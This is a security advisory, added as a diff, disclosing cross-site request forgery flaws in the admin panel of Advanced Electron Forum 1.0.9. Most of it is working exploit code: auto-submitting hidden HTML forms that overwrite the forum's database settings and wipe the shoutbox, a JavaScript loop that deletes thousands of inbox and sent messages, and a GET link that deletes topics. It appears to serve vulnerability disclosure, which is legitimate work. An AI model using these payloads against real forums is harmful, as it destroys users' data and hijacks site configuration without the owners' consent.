@@ -1,0 +1,180 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AEF-CSRF.txt
+
+
+Vendor:
+=============================
+www.anelectron.com/downloads/
+
+
+Product:
+====================================
+Advanced Electron Forum v1.0.9 (AEF)
+Exploit patched current version.
+
+
+Vulnerability Type:
+===================
+CSRF
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+In Admin panel no CSRF protections exist in multiple areas allowing remote
+attackers to make HTTP request on behalf of the victim if they
+currently have a valid session (logged in) and visit or click an infected
+link, resulting in some of the following destructions.
+
+0x01: Change current database settings
+
+0x02: Delete all Inbox / Sent Emails
+
+0x03: Delete all 'shouts'
+
+0x04: Delete all Topics
+
+by the way, edit profile, avatar and more all seem vulnerable as well..
+
+
+Exploit code(s):
+===============
+
+CSRF 0x01:
+
+change mysql db settings
+note: however you will need to know or guess the database name.
+
+<form id="DOOM" accept-charset="ISO-8859-1" action="
+http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=conpan&seadact=mysqlset"
+method="post" name="mysqlsetform">
+<input type="hidden" name="server" value="hyp3rlinx.altervista.org" />
+<input type="hidden" name="user" value="hyp3rlinx" />
+<input type="hidden" name="password" value="DESTROYED" />
+<input type="hidden" name="database" value="AEF" />
+<input type="hidden" name="dbprefix" value="aef_" />
+<script>document.getElementById('DOOM').submit()</script>
+</form>
+
+
+CSRF 0x02:
+
+Delete all Inbox / Sent emails...
+
+<iframe name="demonz" style="display:none" name="hidden-form"></iframe>
+
+<form id="DESTRUCT" target="demonz" action="
+http://localhost/AEF(1.0.9)_Install/index.php?act=usercp&ucpact=sentitems"
+method="post">
+<input type="hidden" id="sent" name="list[]"  />
+<input type="hidden" name="deleteselsent" value="Delete+Selected" />
+</form>
+
+<form id="DOOM" target="demonz" action="
+http://localhost/AEF(1.0.9)_Install/index.php?act=usercp&ucpact=inbox"
+method="post">
+<input type="hidden" id="inbox" name="list[]"  />
+<input type="hidden" name="deleteselinbox" value="Delete+Selected" />
+</form>
+
+<script>
+//Sent Email IDs seem to be stored using even numbers 2,4,6 etc...
+//Inbox Email IDs seem to use odd numbers
+var c=-1
+var uwillsuffer;
+var amttodelete=10000
+var inbox=document.getElementById("inbox")
+var outbox=document.getElementById("sent")
+
+function RUIN_EVERYTHING(){
+c++
+//Inbox IDs are even numbered Sent are odd.
+if(c % 2 == 0){
+arguments[3].value=c
+document.getElementById(arguments[1]).submit()
+}else{
+arguments[2].value=c
+document.getElementById(arguments[0]).submit()
+}
+if(c>=amttodelete){
+  clearInterval(uwillsuffer)
+  alert("Done!")
+ }
+}
+uwillsuffer = setInterval(RUIN_EVERYTHING, 1000, "DOOM", "DESTRUCT", inbox,
+outbox)
+</script>
+
+
+
+CSRF 0x03:
+
+Delete all 'Shouts'
+
+<form accept-charset="ISO-8859-1" id="SPECTOR_OF_HATE" action="
+http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=conpan&seadact=shoutboxset"
+method="post">
+<input type="hidden" name="shouts" value="10" />
+<input type="hidden" name="shoutboxtime" value="1440" />
+<input type="hidden" name="shoutbox_emot" value="on" />
+<input type="hidden" name="shoutbox_nbbc" value="on" />
+<input type="hidden" name="truncatetable" value="on" />
+<input type="hidden" name="delallshouts" value="Delete" />
+<script>document.getElementById('SPECTOR_OF_HATE').submit()</script>
+</form>
+
+
+CSRF 0x04:
+
+Delete all 'Topics' via simple GET request, this will delete topics 1 thru
+7...
+
+http://localhost/AEF(1.0.9)_Install/index.php?act=deletetopic&topid=7,6,5,4,3,2,1
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification:  NA
+January 17, 2016   : Public Disclosure
+
+
+
+Exploitation Technique:
+======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+===================================================================
+Request Method(s):         [+] POST / GET
+
+
+Vulnerable Product:        [+] AEF v1.0.9 (exploit patched version)
+
+
+===================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
